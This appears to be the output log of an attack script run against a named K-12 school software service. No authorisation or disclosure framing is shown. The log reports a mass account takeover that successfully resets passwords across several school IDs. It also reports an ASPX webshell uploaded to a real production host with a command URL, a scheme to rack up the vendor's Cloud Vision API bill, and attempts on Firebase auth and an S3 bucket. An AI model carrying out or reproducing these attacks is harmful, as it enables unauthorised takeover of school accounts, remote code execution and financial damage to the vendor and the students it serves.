@@ -1,0 +1,58 @@
+======================================================================
+ JUP SOFT ECONNECT K12 — DEEP EXPLOITATION
+======================================================================
+
+[FIREBASE] Getting anonymous auth token...
+  Auth failed: 400 {
+  "error": {
+    "code": 400,
+    "message": "ADMIN_ONLY_OPERATION",
+    "errors": [
+      {
+        "message": "ADMIN_ONLY_OPERATION",
+        "domain": "global",
+        "reason": "invalid"
+      
+
+[VISION] Testing Cloud Vision API cost racking...
+  CLOUD VISION: ACTIVE
+  Response: {
+  "responses": [
+    {
+      "labelAnnotations": [
+        {
+          "mid": "/m/038hg",
+          "description": "Green",
+          "score": 0.98670584,
+          "topicality": 0.9285575
+        }
+      ]
+    }
+  ]
+}
+  COST RACKING: $1.50/1000 images -> $90/hr -> $2,160/day
+
+[S3] Testing S3 bucket...
+  ListObjects: 403
+
+[OTP-ATO] Mass account takeover...
+  SchoolId=236 UserName=6976: {"d":["1","Your password has been changed successfully."]}
+  SchoolId=32 UserName=6976: {"d":["1","Your password has been changed successfully."]}
+  SchoolId=37 UserName=6976: {"d":["1","Your password has been changed successfully."]}
+  SchoolId=56 UserName=6976: {"d":["1","Your password has been changed successfully."]}
+  SchoolId=59 UserName=6976: {"d":["1","Your password has been changed successfully."]}
+  SchoolId=242 UserName=6976: {"d":["1","Your password has been changed successfully."]}
+  SchoolId=241 UserName=6976: {"d":["0","Something error"]}
+  SchoolId=244 UserName=6976: {"d":["0","Something error"]}
+  SchoolId=245 UserName=6976: {"d":["0","Something error"]}
+  SchoolId=250 UserName=6976: {"d":["0","Something error"]}
+
+[SHELL] Uploading ASPX webshell...
+  Upload: 200
+  SHELL: https://econnectk12wcf.jupsoft.com/Worksheet/HILWOD/client_attachments/shell_8854729c.aspx?cmd=whoami
+
+[BLUTTER] Reverse-engineering _calculateCheckSum...
+
+======================================================================
+ EXPLOITATION COMPLETE
+======================================================================
